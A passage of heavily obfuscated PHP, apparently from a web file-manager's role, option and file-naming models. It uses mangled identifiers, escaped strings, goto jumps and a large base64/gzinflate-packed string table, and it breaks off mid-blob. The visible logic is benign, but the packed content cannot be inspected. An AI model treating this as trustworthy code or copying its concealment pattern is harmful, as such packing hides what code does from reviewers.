$î®Ÿšª =& $_SERVER[¹ş¤¶ĞÖ]; $–µèÂ×¨ = get_path_ext($ò½ÈÀˆ); $â£Ù¢ = $–µèÂ×¨ ? basename($ò½ÈÀˆ, $î®Ÿšª[10] . $–µèÂ×¨) . $î®Ÿšª[2179] . $–µèÂ×¨ : $ò½ÈÀˆ . $î®Ÿšª[413]; $¹ç§Å¯Ï = array($î®Ÿšª[461] => $¡à‡ôÇ£, $î®Ÿšª[460] => 0, $î®Ÿšª[32] => array($î®Ÿšª[412], $â£Ù¢)); $ÊªÕŸÒ» = $this->field($î®Ÿšª[32])->where($¹ç§Å¯Ï)->select(); $î³úìû = array_to_keyvalue($ÊªÕŸÒ», $î®Ÿšª[12], $î®Ÿšª[32]); return $this->fileNameAutoGet($î³úìû, $ò½ÈÀˆ, $øÒÍ ‘, $¿±Úß»Ô); } public function fileNameAutoGet($ÛÇ„ûö, $àéÉöµÒ, $Çó—Ã÷ß, $ÜÊ˜˜Á) { $şÆ™ç§ü =& $_SERVER[¹ş¤¶ĞÖ]; if ($Çó—Ã÷ß == REPEAT_REPLACE || !$ÛÇ„ûö || !in_array_not_case($àéÉöµÒ, $ÛÇ„ûö) || $ÜÊ˜˜Á && $Çó—Ã÷ß != REPEAT_RENAME_FOLDER) { return $àéÉöµÒ; } if ($Çó—Ã÷ß == REPEAT_SKIP) { return !1; } $•Êìú¿Ğ = $şÆ™ç§ü[10] . get_path_ext($àéÉöµÒ); $•Êìú¿Ğ = $•Êìú¿Ğ == $şÆ™ç§ü[10] || $ÜÊ˜˜Á ? $şÆ™ç§ü[12] : $•Êìú¿Ğ; for ($öÉ‚ä = 1; $öÉ‚ä <= count($ÛÇ„ûö) + 1; $öÉ‚ä++) { $º¸æç™† = substr($àéÉöµÒ, 0, strlen($àéÉöµÒ) - strlen($•Êìú¿Ğ)); $ÎÓ†ä¿ = $º¸æç™† . "\50{$öÉ‚ä}\51{$•Êìú¿Ğ}"; if (!in_array_not_case($ÎÓ†ä¿, $ÛÇ„ûö)) { return $ÎÓ†ä¿; } } } } goto aš©øÌ•¡Ü; c·®ŠÍ™»: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\x65\x6d\137\x6f\x70\x74\x69\x6f\156"; protected $jsonField = array("\155\145\x6e\x75", "\x72\x6f\x6c\x65", "\162\157\x6c\145\107\x72\157\165\x70", "\x72\145\147\x69\163\164", "\x65\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($Åõ±¬) { return "\123\x79\x73\x74\145\x6d\x4f\160\x74\x69\157\156\x5f{$Åõ±¬}"; } protected function optionDefault($´Ì›™… = '') { $›ååâ°Å =& $_SERVER[¹ş¤¶ĞÖ]; if ($´Ì›™… == $›ååâ°Å[12]) { return $GLOBALS[$›ååâ°Å[6]][$›ååâ°Å[410]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x72\157\x6c\145\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x61\x75\x74\x68", "\154\x61\142\145\154", "\x64\x69\163\x70\154\141\x79", "\163\x79\163\164\x65\155", "\144\145\163\143", "\151\147\x6e\157\x72\145\105\170\x74", "\151\147\156\x6f\x72\x65\106\x69\x6c\x65\x53\151\172\145", "\141\144\155\x69\156\151\x73\x74\x72\x61\x74\157\162", "\x73\157\162\x74"); public function listData($¾ÉÓÖú = false, $ß“ô‹ü² = "\163\157\162\x74", $“ÄàµÕÏ = false) { $åš¯¼ÓÔ =& $_SERVER[¹ş¤¶ĞÖ]; $ÓøùÎ¸æ = parent::listData($¾ÉÓÖú, $ß“ô‹ü², $“ÄàµÕÏ); if (!$¾ÉÓÖú) { foreach ($ÓøùÎ¸æ as $ñÇ£Şàø => $ÑäŸ–‰) { if ($ÑäŸ–‰[$åš¯¼ÓÔ[2068]] == 1) { $ÓøùÎ¸æ[$ñÇ£Şàø][$åš¯¼ÓÔ[482]] = LNG($åš¯¼ÓÔ[2304]); } } } return $ÓøùÎ¸æ; } public function update($×¦Éö«ƒ, $ı´¸¤“½) { $„î€ê³æ =& $_SERVER[¹ş¤¶ĞÖ]; $ê©’ıÑ¯ = parent::listData($×¦Éö«ƒ); $½Ñİ÷Ùˆ = $this->findByName($ı´¸¤“½[$„î€ê³æ[32]]); if (!$ê©’ıÑ¯ || $½Ñİ÷Ùˆ && $½Ñİ÷Ùˆ[$„î€ê³æ[428]] != $ê©’ıÑ¯[$„î€ê³æ[428]]) { return !1; } if ($½Ñİ÷Ùˆ[$„î€ê³æ[2068]] == 1) { $ı´¸¤“½ = array($„î€ê³æ[32] => $ı´¸¤“½[$„î€ê³æ[32]], $„î€ê³æ[1889] => $ı´¸¤“½[$„î€ê³æ[1889]]); } $this->filterAuth($ı´¸¤“½[$„î€ê³æ[442]]); return parent::update($×¦Éö«ƒ, $ı´¸¤“½); } public function remove($éÀş°¿Í) { $æí¦œß = parent::listData($éÀş°¿Í); if (!$æí¦œß || $æí¦œß[$_SERVER[¹ş¤¶ĞÖ][1320]]) { return !1; } return parent::remove($éÀş°¿Í); } public function add($Ë°°’âÀ) { $„ôºĞù =& $_SERVER[¹ş¤¶ĞÖ]; $”ÌûØ¶ = $Ë°°’âÀ[$„ôºĞù[32]]; if ($this->findByName($”ÌûØ¶)) { return !1; } $§åƒÒü‚ = array($„ôºĞù[449] => $”ÌûØ¶, $„ôºĞù[1872] => $„ôºĞù[12], $„ôºĞù[1868] => $„ôºĞù[1876], $„ôºĞù[2305] => 1, $„ôºĞù[1871] => 0, $„ôºĞù[2306] => 0, $„ôºĞù[1870] => $this->getSort()); $Ë°°’âÀ = array_merge($§åƒÒü‚, $Ë°°’âÀ); $this->filterAuth($Ë°°’âÀ[$„ôºĞù[442]]); return parent::insert($Ë°°’âÀ); } private function getSort() { $ö…ÅÖ¢¢ =& $_SERVER[¹ş¤¶ĞÖ]; $ØÆòø÷ = parent::listData(); $³üèÀø = array_to_keyvalue($ØÆòø÷, $ö…ÅÖ¢¢[12], $ö…ÅÖ¢¢[1890]); return empty($³üèÀø) ? 0 : max($³üèÀø) + 1; } private function filterAuth(&$©ïì®³©) { $íÁçı¬ =& $_SERVER[¹ş¤¶ĞÖ]; $’±÷•­‘ = array(); $†ã”ê‘‰ = array_filter(explode($íÁçı¬[50], $©ïì®³©)); foreach ($†ã”ê‘‰ as $©ïì®³©) { $÷Ü¹ßÚ = explode($íÁçı¬[10], $©ïì®³©); if ($÷Ü¹ßÚ[0] == $íÁçı¬[2307] && $÷Ü¹ßÚ[1] != $íÁçı¬[1223]) { $Ò¨†´Š = $÷Ü¹ßÚ[0] . $íÁçı¬[10] . $÷Ü¹ßÚ[1] . $íÁçı¬[2308]; if (!in_array($Ò¨†´Š, $†ã”ê‘‰)) { $’±÷•­‘[] = $Ò¨†´Š; } } $’±÷•­‘[] = $©ïì®³©; } $©ïì®³© = implode($íÁçı¬[50], $’±÷•­‘); } public function findRoleDefault() { $ïí½ñ¦Ü =& $_SERVER[¹ş¤¶ĞÖ]; $ñÌ†²Öâ = parent::listData(); $È¿ÂÆŒ› = !1; foreach ($ñÌ†²Öâ as $¥‡×ñÆÜ) { if (!$¥‡×ñÆÜ || $¥‡×ñÆÜ[$ïí½ñ¦Ü[1888]] == $ïí½ñ¦Ü[198] || $¥‡×ñÆÜ[$ïí½ñ¦Ü[2068]] == 1) { continue; } if (strstr($¥‡×ñÆÜ[$ïí½ñ¦Ü[442]], $ïí½ñ¦Ü[2309])) { continue; } if (!strstr($¥‡×ñÆÜ[$ïí½ñ¦Ü[442]], $ïí½ñ¦Ü[2310])) { continue; } if (!$È¿ÂÆŒ›) { $È¿ÂÆŒ› = $¥‡×ñÆÜ; continue; } $ŸòÃÑ½Š = explode($ïí½ñ¦Ü[50], $È¿ÂÆŒ›[$ïí½ñ¦Ü[442]]); $³×€™™ø = explode($ïí½ñ¦Ü[50], $¥‡×ñÆÜ[$ïí½ñ¦Ü[442]]); if (count($ŸòÃÑ½Š) > count($³×€™™ø)) { $È¿ÂÆŒ› = $¥‡×ñÆÜ; } } return $È¿ÂÆŒ› ? $È¿ÂÆŒ›[$ïí½ñ¦Ü[428]] : $ïí½ñ¦Ü[12]; } public function sort($¢ì™¢‰, $—ÍáìÖ) { return parent::update($¢ì™¢‰, $—ÍáìÖ); } } goto fÁ¤›µ‰¹Í; F©«†áÖ’µ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\271\376\244\266\320\326", "\xda\x94\xd7\xd4\xcb\xea"); $_SERVER[¹ş¤¶ĞÖ] = explode("\x7c\x1\x7c\x1\x7c\x2", gzinflate(substr(strrev('vÀç$["V9mN\'nvÃ¢vÁXZ R…-	iN8õÅ|	½Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹').strrev('›úRIná ä)(QÊP)@¥¡|«†r”£îBB€m'."\0".'îiÄ•İ•i,o%i+6').base64_decode('482xKxm+/8//9/n8Aolm3hw7x5s3b9689+bD57fc9+qF419A/+375G8f+fTRU2l4/A==').base64_decode('S+Q/Ej7mnEn7kD/fOOfsurrO2QdM7/7q+b+6UfvCgx8+/KvHtz776uPXJTML796aOw==').base64_decode('ep/lf9nzq2aUkxZspj9K0XQUfdSwHZsC0mYxa+Ro2CjS3yD96Y1HLb1gOjqNBuiPCg==').strrev(' º/IfKS«‘­FËt—ï€V–i*30^œ³S!\'ÓÛÑ5Ic»WKòëÚÿ"').base64_decode('0RwtpdlQU3ur2h7uicZWqclVPWHIkVLXlXVrjMZIMOFolpM0CjrPMWLxdrWGF0e6lQ==').base64_decode('ZDzUnQi1JSOxbgpui3V1RZKV8HgsGm0NtS2tTOmJhxZ3hRTUvryuGsWsWaesoSlrlA==')."\172\32\350\60\364\174\206\6\213\32\153\216\63\126\202\120\222\207\320\64\25\313\371\74\215\164\363\120\106\317\152\345\74\214\126\273\34\51\131\106\101\143\235\136\252\217\161\50\15"."\150\145\307\64\212\151\32\11\217\72\226\46\340\250\255\151\64\321\172\21\252\112\204\243\341\266\244\202\33\250\164\304\143\135\12\114\102\101\263\35\335\122\126\164\206\343\141\5\67".strrev('Hé3Aj€1f'."\n".'m(F"•u¥qÃÛÅ‹*U2ĞÕbP½¢eQ¢„¡CFé|Vµô–¥º')."\x4d\xd\xc7\xe3\x34\xe0\x3\xf4\x8e\x46\xf0\xa4\x41\x24\xd6\xd1\x91\x8\xf3\x18\x74\x6e\x59\x14\xb5\x64\x6\xe0\xa7\x2b\x96\xc9\xe6\x1d\x75\x58\xcb\x97\x19\x9a\xe\xd1\xdf\x5a\xf8\x81\x5f\xd3\x6".strrev('fÓª[¦œT¥2;úBË`ÓhyXMå@P g¢ërÌ AY|šaT) 2g]Ô')."\306\50\302\142\135\4\110\247\71\203\355\226\201\62\320\170\326\314\147\130\330\66\326\103\127\262\106\136\357\56\27\344\54\74\232\36\64\362\31\213\255\257\317\312\111\243\121\276\134"."\161\136\21\53\241\226\214\263\225\156\144\307\304\172\303\371\172\170\252\155\226\255\264\36\101\353\203\306\33\1\254\73\16\352\34\214\215\141\366\226\362\246\226\111\350\26\357\232\141"."\166\240\212\142\145\107\6\226\111\266\16\323\52\264\43\312\0\337\107\253\302\350\255\222\60\304\326\105\106\32\261\140\135\337\51\376\117\7\372\116\104\377\324\3\351\353\207\66\15"."\xea\xf9\xbc\xaa\x8f\xea\xb0\x70\xa\x99\x59\x36\x1b\x8c\xa0\x9d\x32\x8a\x41\x4\xa1\xd1\x48\x4c\x1d\xd4\xec\xc1\xae\xcc\x2c\x95\x94\x82\x26\x17\x33\xfa\x68\xa0\x34\x58\xa2\x51\xb1\xa4\xfb\x5d\x88"."\x8d\x87\xae\xdb\x74\xc2\x12\x5d\xce\x9b\x69\x2d\x2f\x77\x91\x86\x7\x1d\xa7\x94\xd0\x8b\x19\x3c\x12\xd0\x15\x73\xa4\x48\x46\xaa\xa4\xeb\x90\xa9\xdd\xa7\x64\x94\x2e\x65\x95\xd2\xd9\x6c\x34\xdb\xac".strrev('A®–;oÇtv™ Å˜cšÒ7”©ZXœ(M†ƒàjÛ¥“3¦Ê3 sfw¬CÏ!`').base64_decode('oXRat21/m1l0LDPvD+Xz5og/Zhk5o9isTKN5cCJa1H5MAJthpdbMVzDi4M9Mayk7WQ==').base64_decode('/1y2AnluSyvaWd3yh2FlNCuosZwKsmzthl0ybQM3r1nRHEdLD2IKIqpv+Yz8RjFvFA==')."\xf5\x8a\xbc\xe1\xd1\x92\x61\xe9\x36\x6b\xab\xb2\xb8\x2b\x9\x95\xa0\xda\x75\x7f\x8f\xa5\xe5\xa\x5a\xb3\x52\x2a\xa7\xd0\xc8\xc0\x4a\xad\x2\xa3\xb9\x61\x68\x9a\x95\x34\x8e\xfa\x94\x42\xd9\x76\xfc"."\226\216\110\221\201\266\73\30\344\110\326\337\205\327\225\241\147\374\11\104\261\1\74\243\141\246\202\120\107\141\151\24\332\231\114\366\250\221\16\264\45\167\207\325\256\120\262\255\23"."\x9a\xed\x68\x39\xd6\xe6\x28\xa2\xc3\xbc\x4a\x6\x5c\xe9\x47\xeb\xb\x23\x57\x37\xea\xab\x0\xf6\x98\x23\xba\x85\x3e\xdc\x3a\xd6\xac\xc\x99\x99\x94\x39\x1a\x60\x49\x38\x73\x2\x11\x1a\x96\x19\x4f".base64_decode('d8nxx7ViDo9PaszRAQXt4Zx7oKN6MecMsoKJcHx5OK4mYh3JFaE4bOZFhCWj7FO46g==')."\274\77\256\147\320\320\247\35\126\116\53\341\121\143\171\360\342\300\163\305\122\361\202\141\151\321\310\142\74\60\355\176\33\145\362\313\271\130\335\121\243\140\340\266\73\74\205\214\44".strrev('Ó W–†±¥lÃSJÊ! ¢ÀÚ`{_}Zwú?zôÌşº´öı-C¤‚ƒCéÚ').base64_decode('FTkalNhS97AIbC6aRf0zBgfvXdKy9wwrBcbDy3rDiaTaFU52xtrh6+EQhKImXbastw==')."\x7d\xf4\x67\x0\x66\x77\x80\xfe\xa8\x86\xdd\x21\x6d\x2b\x38\xca\xc9\x8f\x6a\xa6\xd6\xa2\xc9\xe8\xd2\x19\x8d\xcd\x52\x1a\x1d\x29\x68\x39\x89\xc8\x63\x28\x8e\x75\x99\x96\xee\x86\x8c\xf3\xad\x6a\x85"."\221\341\173\4\212\166\352\106\156\20\306\313\300\265\245\315\274\151\151\171\114\31\331\242\320\31\265\312\31\100\255\200\10\213\110\302\50\224\130\143\235\301\162\41\45\5\201\332\73".base64_decode('fKeyESax8KDJdzbTglBzEIpMbeqAZRkLJmag/wWRz5gFjZFMQuz0DKV2FDTNldKpaw==')."\142\273\166\54\307\304\120\313\225\5\15\355\240\11\123\234\323\131\223\312\274\155\254\225\31\75\257\263\161\31\324\331\206\321\0\331\320\206\307\107\55\313\147\17\361\175\10\52\166"."\152\303\216\243\222\230\274\263\370\12\314\50\13\100\36\355\120\61\62\343\42\336\143\351\131\3\26\151\21\315\110\227\146\15\261\76\240\31\20\270\202\43\22\36\165\364\106\243\152"."\x5b\xac\x3b\x89\x58\x6a\xa\x59\x11\x8f\x24\xc3\xc\x6f\x43\xed\x6a\xa8\xad\x67\x9c\x6d\xbc\x62\x46\x21\x3\x26\x30\x6e\xc4\x17\xec\xf3\x70\x13\xcc\x2c\x6a\x4e\x50\x6c\x73\x88\x62\x97\xcc\xa2\xad"."\373\323\120\102\260\336\25\111\31\261\13\320\34\322\316\341\331\14\106\375\132\141\275\277\200\226\200\237\67\324\275\7\53\260\73\320\255\74\2\163\43\210\73\36\106\164\52\142\233"."\177\117\54\1\5\26\141\50\142\300\122\272\5\37\353\351\205\244\202\204\27\213\303\0\74\0\120\151\120\153\4\44\132\221\140\204\271\214\362\133\306\172\115\164\151\21\153\17\353".base64_decode('SCEv+Dl3r/xi5FGVM/2dXaE2f6Iz1DRrNoWuKmT6k52G3X8Sj8O4jdgzVUtHBzFWcw==')."\123\3\64\116\307\273\250\324\236\125\376\202\37\327\202\207\54\320\320\320\300\352\232\76\133\31\104\134\43\340\254\131\314\220\151\201\301\112\225\323\103\154\131\150\151\306\320\340\23"."\x9f\xed\x1f\x31\x18\x45\x39\x9e\xf3\x7e\xc7\x57\xa2\xcb\xf1\x6e\xd2\x9\x55\x94\x9\xe3\xa2\x6a\x69\xfc\x31\x15\xd5\xe8\x94\x6d\x79\x68\xd0\xe2\xc9\xa0\x42\x6\xe3\xd3\x28\x54\xcb\xe7\xd0\x28\x3b"."\203\5\31\50\146\232\306\165\312\76\360\311\342\243\210\307\326\215\324\162\223\112\46\342\34\240\33\53\253\266\141\145\265\66\254\364\264\141\145\145\33\50\310\66\162\105\324\113\106".strrev('“U$I^Íâ4PòĞ›EíÓ²XÖğÊÍlCÚ{{ÂVJhİ#U=¬Wj¥î‘“¢')."\20\254\67\354\111\101\47\376\236\170\270\43\262\222\107\73\42\341\150\173\102\155\13\265\165\212\74\335\241\56\210\250\131\174\346\266\203\356\374\52\332\115\23\374\344\256\16\143\51".strrev('„¯Sú:¢8Æ¥¨'."\r".'mCó×¶e¤†TOH>Ët8:MqÄP1ÙVXuÕBÃ')."\x8a\x53\x82\x3a\x10\xb1\x4f\x8d\xf1\x20\xe9\x6\x8b\xa3\xb3\x1\x7c\x5f\x81\x9d\xbd\xa2\x5\x2a\xce\xd3\xaa\x67\xf9\x86\x5b\x1d\x10\xca\x3a\x7c\x5f\xf7\xc4\x11\x95\x13\x69\x68\x6\x42\x44\xc8\x82".base64_decode('MIHMCHzGQDTTckKsOVkh4FBjPeF4CItH1BXxWPdiKDAyqLMGRGD46xgXDVISR+w3iA==')."\5\326\330\161\131\14\372\132\223\15\345\70\375\71\201\376\40\356\37\76\256\27\331\250\247\360\326\313\330\10\26\310\42\262\307\266\115\263\314\277\226\62\115\370\102\36\63\202\343"."\x6c\x67\xe0\x52\x96\xb5\x36\x43\x92\x51\xb6\xa7\x4c\x1f\x67\xa4\xc\x50\x37\xb6\x34\xdc\xad\x32\xcc\xa2\x31\x9\x1b\x29\x20\x1c\x8f\xc7\xe2\x30\x20\x8e\x39\xc4\xe\xdf\x34\x31\x1e\x4e\x30\x72\x8e"."\311\246\301\206\53\30\230\16\130\254\43\16\3\76\37\134\335\77\62\275\256\317\77\75\60\200\2\365\323\116\244\121\210\365\7\134\321\343\241\174\331\342\245\61\177\134\147\57\252"._kodDe('K+Fi6QLe+igJeOre7/Io+e0v8rPy8efwM/NnX//lW8/AJnt/k4F+Mw4gMn7w6ZlC7us=')._kodDe('LYu/7AT464xbEJgQzJ8pVXBLURPujufKZeWjlBOZSYqaZto6mWB5StdVe4RgoSPmdTc=').base64_decode('SUA3zN7I4GgO9Zwo0efvnz6wSCongbzfQpQUbbSDPF/IfxLuGS+K1z3gR7mYFtsSXg==')."\x17\x29\x2d\xd\x74\x0\xd1\x48\xbe\x84\x10\xcb\xc6\x5\x32\xee\xe3\xda\x86\xa9\xf4\x77\x23\x9b\xc8\x9c\xe\x8b\x9e\x48\x5c\x2d\xc0\xce\x72\xd1\x58\xc7\xe4\x4d\x45\x7d\x1d\x4\x4c\x87\xe1\x77\x4a"."\x77\x46\x74\x86\x1e\x8\xee\x8a\x23\xe4\x60\x74\x1f\x25\x49\xb1\xbc\xb4\x67\x90\x93\x33\xc7\x51\x8e\x4c\x46\x49\xc5\xac\xf4\x8\x8f\xa1\x6d\x4\xe6\x69\x32\xe4\xb6\xd3\x5a\x49\x4f\x48\x3d\x54\xd5".strrev('9„¹vÔÄLÕ¦YnŠ!'."\n".'òëÛåaKYÅ¤>Œ¨ šê,Ùr¶*„âÌJ…V5¨d')."\157\164\4\167\320\330\52\150\3\127\132\26\52\164\310\241\234\52\117\100\111\143\14\41\26\253\350\142\321\143\12\5\155\52\211\31\262\21\277\314\330\330\140\135\177\177\271\117\317"."\14\364\41\304\327\374\331\201\15\63\66\326\263\343\134\260\37\375\141\221\120\25\201\251\312\251\241\212\30\261\0\156\7\227\231\271\42\74\231\106\115\213\363\302\45\327\151\311\61".strrev('ıIwU“áÏ'."\0".'Ğ‘.\'Q$„g'."\r".'isvœ„Í$“g˜X ¨íéCœ¹0!‰"ªï-')."\133\100\22\224\65\212\150\71\265\111\133\35\225\341\45\306\154\107\57\270\304\323\266\256\131\351\301\216\162\76\357\360\63\133\336\30\202\57\300\132\1\151\271\237\376\50\323\253\25"."\xed\x30\x2d\x26\xfa\x98\x6\xcd\xa8\x99\x56\x2d\x63\xa4\x58\x34\x33\x29\x19\xd5\xc4\x26\xbb\x38\x84\xd8\x99\xa4\x52\xc7\x24\xbb\x4a\xa4\x5b\x69\x8d\xc5\xa2\xe1\x50\xb7\x82\xf7\x73\xd8\x87\x10\xb3"."\220\10\367\204\320\46\206\205\50\211\144\30\204\315\221\166\77\253\167\245\77\2\107\151\36\60\140\330\315\22\345\33\165\107\105\107\326\41\66\227\210\40\72\54\53\210\102\41\206"."\x4f\x14\x3e\x2c\xa\xf4\x61\x4e\xc3\x87\xfa\xe0\xc3\xe7\x60\x9f\x38\xa4\xf9\x84\x64\xd5\x37\x6c\xe8\x23\x24\xc0\x4f\x55\x3e\x38\x6c\xf9\x10\xef\x8b\x18\x6\xcc\xde\x42\x30\xd2\xee\x33\xec\x76\x72"."\x3e\x24\x1f\x20\x49\xac\x41\xce\x20\x16\x78\xe5\xb5\x31\x1f\x6d\x5c\x54\x1f\xd6\xf3\x3e\xd6\x34\x1f\x6b\xb1\x8f\x9\x1\x7c\xe4\xe4\xde\xe\xcd\xea\x45\x8b\xb\x9a\x45\x82\x88\x86\xe\xfa\x30\x3a"."\141\154\366\11\131\257\317\34\51\352\26\311\2\303\44\216\226\76\161\354\364\345\54\263\134\352\141\337\224\142\264\131\0\20\155\346\200\270\151\72\76\46\124\360\311\362\6\150\105"."\210\255\232\252\303\131\275\67\144\374\275\215\200\271\303\111\225\243\364\71\223\125\71\37\156\331\312\6\132\43\10\157\66\262\75\317\225\107\114\57\133\206\171\135\304\360\4\210\320"."\162\261\214\161\207\72\264\141\31\363\252\141\41\333\171\30\32\13\61\257\20\360\13\116\330\53\100\360\212\376\361\107\223\132\56\41\175\316\321\162\354\133\230\224\241\324\11\263\322"."\160\134\117\217\245\205\104\242\135\222\163\270\143\356\305\125\106\365\45\264\254\247\223\76\262\312\252\255\220\352\30\300\261\236\117\330\1\223\47\263\21\147\113\201\317\276\153\5\175".base64_decode('/tqFXhJyGSsJhoM2FpPsBNoAO/JsiJrkZCDWPncML70AId7k/izBRVfRcEdSWRJDlA==')."\316\60\125\132\106\305\231\25\362\217\131\124\134\165\263\341\122\132\110\272\210\153\305\14\205\254\101\273\302\232\226\32\366\221\32\127\161\201\64\356\106\370\130\324\365\65\61\377\362"."\40\140\344\40\335\27\73\31\3\305\304\306\131\6\56\121\263\341\274\206\357\103\40\244\63\230\230\132\31\113\45\142\44\0\254\135\256\357\342\250\130\141\14\45\24\374\1\250\200"."\xf0\x35\x98\xe0\xf8\xc5\x5a\x91\xa2\xee\x21\xf7\x60\xa4\x67\xbb\xc5\x43\xd4\x63\x14\xc7\x8c\xa2\x2c\xba\x14\xd0\x71\xbe\x63\xb\x86\x1\x2f\x75\x8f\xb0\xb5\x7d\xa2\x30\xdd\x62\x84\x68\xd4\x7\x22"."\x53\x5f\xde\x28\xe\x49\x9b\xb9\x90\xdb\xa1\xd6\xe3\xa2\x52\xdb\xa1\x26\x4f\xcb\x19\xd1\xf5\xbb\x16\x34\x20\xf9\xa0\x66\x89\xf1\x63\x64\x8\xd3\x2\x21\x3\xc6\x59\x44\x54\xca\x96\xd5\x86\x5\xff"."\xe2\x2a\x23\x11\x13\xdb\x19\x63\xd\x96\x83\xee\x4a\x69\xb4\xdd\x47\x7e\x3b\x51\xc7\xe5\x15\xca\x67\x4\x93\xe\x96\x89\xd2\x20\xb4\xfc\xa3\x68\x78\xd0\xf\xe9\x48\xd2\xf4\x61\xa1\x31\xfa\xa1\xbb"."\x3c\xbb\xb5\x24\x99\x18\xaa\x97\xb\xed\x70\x37\x87\xc3\xcb\xd1\x9a\x7\x5c\xc1\x63\x5c\xc7\x68\x6\xf0\x1a\xaa\x24\x31\xe0\x34\xc7\x4d\xd0\x68\x4b\x42\x9c\xbe\xa3\x5d\x13\xed\x79\x34\x8c\x58\xfb"."\74\332\352\254\0\136\42\213\361\206\305\306\207\122\67\31\345\22\72\352\63\224\23\265\45\52\322\344\334\102\54\210\151\277\330\53\330\270\212\25\46\306\132\54\247\234\150\20\36"."\x5a\xb5\xb2\x1d\x18\x81\xab\xc7\x3b\x2c\x93\xf3\xc1\x7c\xdb\xf7\x66\x6a\x23\x7\x4d\x7e\x11\xed\xd9\xaa\xa5\xf1\x70\xb1\x17\x15\x20\xa9\x8c\x97\xd1\xf0\x40\x3d\x51\x31\x11\xae\x7d\x86\x82\xd8\x9d".base64_decode('gZYpGMWARXezADo+gPKAr0HixQSZ2WCTfQF2v42eeXZME51JrYCFviwaJJE4oA/kbg==').base64_decode('GW+DMgfBa7FRgkSs3YwSK5koaYxGw4mjzD/DuToaLRrpIbFStWEN4R9UTTojaQGQeA==').strrev('Š}uN¬–ÈÓ€Şnœ®©¾N/“<ì›$É€¦;dC‚ìš1x!ƒ†3„v˜Æ3”')."\xb4\x59\x2\x8c\x90\x14\x89\xa\xe6\xb0\x2e\x1\x3\xb6\x63\x96\x44\x8a\x14\xa5\xc9\x52\x92\xa8\x54\xca\xc5\x27\x89\xb4\x8\xad\xaf\xc\x61\x98\xc5\x90\x91\xbc\x50\x96\x9c\xbd\xe9\x12\xe\xe0\xd3".base64_decode('RkCMaqQ9ZFkMgWk38W0dAsogTAsTbPVV265o5eFhoSZEq8IfDtDlH9AymRi7sZTDlQ==')."\131\145\71\144\365\212\210\316\26\257\112\212\125\317\36\312\347\205\236\207\67\76\141\21\272\354\345\102\62\144\302\142\35\344\340\313\356\135\253\301\370\41\107\136\166\156\106\335\313"."\306\273\111\365\304\54\13\133\234\336\363\10\237\306\352\161\264\313\267\15\32\105\335\346\233\265\145\127\243\131\377\217\171\343\312\221\307\53\144\42\164\301\151\222\304\32\253\53\16"."\xeb\xf2\x9\x82\x8b\x65\x5\xc9\xe2\x5b\xf8\xb8\x97\x31\x1\xe6\x40\x8a\xa8\x8e\x8b\xa5\x8a\x93\xfa\xa5\xe5\xe4\xc2\x10\xb4\x7c\xe9\x78\xe0\x2d\x2b\x12\xb\xd8\x13\xe0\xac\x37\x9f\xce\x84\xd6\x84"."\6\216\362\235\126\56\204\223\360\134\116\124\51\117\347\225\11\366\115\316\207\160\25\47\114\124\15\113\346\265\74\362\347\253\357\277\342\115\32\276\363\366\13\317\277\374\176\300\46"."\xd3\x2e\xa7\xf2\xeb\x69\x4\xae\x3c\xd1\xdf\x2f\x8f\xef\x47\xc3\x42\x4f\x75\xd3\x8a\x3e\xf3\xa8\x47\xf\xeb\x38\xe6\xc5\xbf\x6e\x7f\xf8\xd7\x57\x5e\x73\x6c\xf8\xac\x43\xeb\x67\xf5\x6a\x67\x4f\x39".base64_decode('65Cpqy/+Qf6uP6bunL/0prn33Lb1ssMifwp2vPTwWOf3rwr0TPGfdPWXT7py87evDA==')."\235\172\302\356\373\257\15\174\64\345\322\227\357\172\363\246\314\324\175\177\162\251\275\363\361\67\347\345\356\263\57\175\163\313\61\13\76\332\276\345\230\3\17\176\373\213\317\156\172".base64_decode('bZ+PZ750xuEnXHDz3OePuTmw64DsZJ/9tXfvLb76/l1nnHrKZT+6fuqn91928PMPjQ==').base64_decode('Ppy78PnvfeH4rZ0bA1/xTZty4omN33/0d2177+na99tRLfq3EwtvPNf871k3/uKdkQ==')."\243\266\336\72\170\317\11\133\263\333\176\162\107\335\21\347\333\227\316\272\140\336\364\334\171\337\271\357\232\373\357\127\136\30\177\276\320\373\121\373\236\367\156\355\77\253\166\363\163"."\107\137\141\316\356\73\152\307\317\57\317\174\171\341\361\57\44\216\352\376\345\363\127\317\36\376\317\205\275\271\243\217\374\347\212\163\356\252\231\371\376\344\261\323\56\65\177\365\100"."\303\225\357\330\173\37\236\367\315\43\247\337\265\365\301\341\332\155\77\332\321\366\314\136\343\345\216\307\372\17\171\176\371\115\367\247\36\170\372\351\151\273\222\57\115\172\134\331\136"."\xfc\x43\x6b\xfa\xcc\x3b\x36\xd6\xef\xf9\xe6\x7f\xbe\x73\xeb\xb3\xc1\xc3\x37\x2d\x7f\xf1\xf1\x5f\x3c\x65\x84\x3f\xb6\xce\x3b\x66\xdd\xde\x93\xbf\xb8\xc5\x39\xec\xe3\xfd\x7e\x31\x30\xe9\x89\xc7\xe".strrev('òÊ~¼¤¿çÃı9ßü¶ğ¸¾vÓ‚ğ8^³Ô÷¯ºÉã~zï®7ûs:ofêò>')."\xa9\x4d\x7\xff\x2e\xa5\x7e\x6b\xd9\x9b\x53\x6f\x7d\xa1\x21\x9e\x9\xaf\x3f\x77\x4b\xdf\xb3\xa1\x87\xa2\x73\xd7\x74\xff\xcd\xde\xbd\xcf\x51\x1f\x64\x2f\x7f\xea\x8b\x97\x9c\xf7\xd6\xde\xd3\x7b\x4e"."\232\263\346\267\357\335\175\304\63\317\257\131\242\344\307\172\356\116\117\232\364\346\366\201\225\35\223\142\353\363\376\133\157\335\177\277\257\367\235\324\165\106\337\257\215\307\156\14\154"."\x7d\xf3\xb6\xe9\x37\xa5\x33\x8f\xfd\xfe\x90\x1b\x7e\xb9\xeb\x7f\xde\xed\x7e\xbe\xb8\x